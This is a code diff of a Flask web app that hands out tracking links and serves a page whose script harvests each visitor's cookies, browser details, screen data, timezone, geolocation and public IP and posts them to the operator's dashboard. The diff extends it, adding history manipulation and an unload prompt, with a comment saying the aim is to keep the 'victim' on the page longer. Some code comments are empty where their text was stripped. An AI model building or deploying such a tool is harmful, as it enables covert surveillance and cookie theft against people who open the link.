@@ -2,16 +2,16 @@
 import os
 import uuid
 from datetime import datetime
-from flask import Flask, request, render_template_string, redirect, session
+from flask import Flask, request, render_template_string, redirect, session, jsonify
 
 app = Flask(__name__)
-app.secret_key = os.environ.get('SECRET_KEY', 'supersecretkey2025')  #      
+app.secret_key = os.environ.get('SECRET_KEY', 'default-secret-key-change-it')
 
-#   ()
+#   ()
 reports = {}
 
-#  HTML (UID   )
-DASHBOARD = """
+#  HTML
+DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -64,7 +64,6 @@ DASHBOARD = """
         navigator.clipboard.writeText(inp.value);
         alert('Link copied!');
     }
-    // auto refresh every 5 seconds
     setInterval(() => location.reload(), 5000);
 </script>
 </body>
@@ -72,7 +71,7 @@ DASHBOARD = """
 """
 
 #   ( )
-SPY_PAGE = """
+SPY_PAGE_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
@@ -87,40 +86,59 @@ SPY_PAGE = """
         (async function() {
             const server = "{{ server }}";
             const uid = "{{ uid }}";
+            
             async function sendData(data) {
                 try {
-                    let response = await fetch(server + '/api/report/' + uid, {
+                    const response = await fetch(server + '/api/report/' + uid, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify(data)
                     });
-                    if (!response.ok) console.error('Send failed', response.status);
-                } catch(e) { console.error(e); }
+                    if (response.ok) {
+                        console.log('Data sent successfully');
+                    } else {
+                        console.error('Failed to send data, status:', response.status);
+                    }
+                } catch(e) {
+                    console.error('Fetch error:', e);
+                }
             }
-            let victimData = {
+            
+            // Basic information
+            let info = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookies: document.cookie,
                 localStorageSize: localStorage.length,
                 url: window.location.href,
                 timestamp: new Date().toISOString()
             };
-            await sendData(victimData);
+            await sendData(info);
+            
+            // Geolocation (if permitted)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    pos => sendData({ location: {lat: pos.coords.latitude, lon: pos.coords.longitude} }),
-                    () => {}
+                    position => {
+                        sendData({ location: { lat: position.coords.latitude, lon: position.coords.longitude } });
+                    },
+                    error => console.log("Geolocation denied")
                 );
             }
+            
+            // Public IP
             try {
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
                 await sendData({ ip: ipData.ip });
-            } catch(e) {}
-            window.onbeforeunload = () => true;
+            } catch(e) { console.log("IP fetch failed"); }
+            
+            // Keep page busy so victim stays longer
+            window.onbeforeunload = function() { return true; };
+            setInterval(() => { history.pushState({}, '', '/'); }, 1000);
         })();
     </script>
 </body>
@@ -133,19 +151,19 @@ def home():
 
 @app.route('/dashboard')
 def dashboard():
-    #   UID ,     
     if 'uid' not in session:
         session['uid'] = str(uuid.uuid4())[:8]
-        #   UID-    
         if session['uid'] not in reports:
             reports[session['uid']] = {'data': []}
     uid = session['uid']
+    # Ensure reports entry exists
+    if uid not in reports:
+        reports[uid] = {'data': []}
     link = request.host_url.rstrip('/') + '/spy/' + uid
-    return render_template_string(DASHBOARD, link=link, uid=uid, reports=reports)
+    return render_template_string(DASHBOARD_HTML, link=link, uid=uid, reports=reports)
 
 @app.route('/new_uid', methods=['POST'])
 def new_uid():
-    #  UID      
     session['uid'] = str(uuid.uuid4())[:8]
     if session['uid'] not in reports:
         reports[session['uid']] = {'data': []}
@@ -155,7 +173,7 @@ def new_uid():
 def spy(uid):
     if uid not in reports:
         reports[uid] = {'data': []}
-    return render_template_string(SPY_PAGE, server=request.host_url.rstrip('/'), uid=uid)
+    return render_template_string(SPY_PAGE_HTML, server=request.host_url.rstrip('/'), uid=uid)
 
 @app.route('/api/report/<uid>', methods=['POST'])
 def report(uid):
@@ -163,14 +181,18 @@ def report(uid):
         reports[uid] = {'data': []}
     try:
         data = request.get_json()
-    except:
-        data = {"error": "invalid json"}
+        if data is None:
+            data = {"error": "No JSON received"}
+    except Exception as e:
+        data = {"error": str(e)}
     reports[uid]['data'].append({
         'time': datetime.now().strftime('%H:%M:%S'),
         'data': data
     })
-    return "OK", 200
+    # Also print to console for debugging (will appear in render logs)
+    print(f"[DEBUG] Data received for UID {uid}: {data}")
+    return jsonify({"status": "ok"}), 200
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, debug=False)
